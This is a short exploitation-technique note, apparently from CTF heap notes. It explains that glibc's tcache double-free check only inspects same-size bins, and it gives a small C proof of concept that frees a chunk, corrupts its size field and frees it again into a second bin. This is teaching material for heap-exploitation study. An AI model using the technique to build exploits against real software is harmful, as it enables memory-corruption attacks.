<details>
<summary><strong>Description</strong></summary>
<p>

"the tcache double free check will only be able to detect another tcache freed chunk, since it checks for the tcache key..."

**and it only check for tcache chunks has the same size**, it cannot detect if the chunk we're trying to free already exists in different tcache bins. This is what we are going to leverage...

so basically we are going to insert a chunk into the tcache bins, modify it size field, then insert it into another tcache bins...

</p>
</details>

<details>
<summary><strong>POC</strong></summary>
<p>

> compiled with glibc `2.31`, `2.35`, `2.38` and `2.39`

```c
#include <stdio.h>
#include <stdlib.h>

void main() {
    setbuf(stdin, NULL); // disable buffering so _IO_FILE does not interfere with our heap
    setbuf(stdout, NULL);

    long *p;

    p = malloc(0x78); // request size must be in tcache range

    free(p); // p goes to 0x80 tcache
    // [tcache 0x80]: p
    
    // VULNERABILITY
    p[-1] = 0x21; // change size field of p to 0x20 chunk
    free(p);
    // VULNERABILITY

    printf("now that chunk p exists both in 0x80 tcache and 0x20 tcache\n");
}
```

</p>
</details>

<details>
<summary><strong>Ref</strong></summary>
<p>

- https://github.com/johnathanhuutri/CTFNote/tree/master/Heap-Exploitation#free-same-chunk-with-different-sizes-table-of-content

</p>